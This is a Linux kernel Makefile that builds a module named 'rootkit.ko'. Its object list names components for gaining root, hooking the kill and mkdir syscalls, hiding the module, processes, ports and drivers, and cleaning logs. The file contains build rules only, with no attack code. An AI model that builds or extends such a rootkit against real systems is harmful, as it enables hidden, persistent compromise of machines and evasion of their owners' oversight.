# this is a make file for a kernel object
# see online for more information

# will build "hello.ko"
obj-m += rootkit.o mkdir.o kill.o

# we have no file "hello.c" in this example
# therefore we specify: module hello.ko relies on
# main.c and greet.c ... it's this makefile module magic thing..
# see online resources for more information
# YOU DON'T need this IF you have *.c-file with the name of the
# final kernel module :)
rootkit-y := \
	main.o \
	setroot.o \
	hook_kill.o \
	hook_mkdir.o \
	hide_module.o \
	reveal_ftrace.o \
	hide_module.o \
	hide_port.o \
	hide_process.o \
	log_clean.o \
	hide_driver.o

#rootkit-y := main.o \
#			hide_port.o \
#			hide_process.o

#KDIR=/home/sciver/Vagrant/ubuntu2004/rootfs/lib/modules/6.0.2/build/
#KDIR=/home/sciver/Vagrant/ubuntu2004/linux-5.4.0
KDIR=/lib/modules/$(shell uname -r)/build
# KDIR=/home/sciver/Vagrant/ubuntu2004/5.4.0-128-generic/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
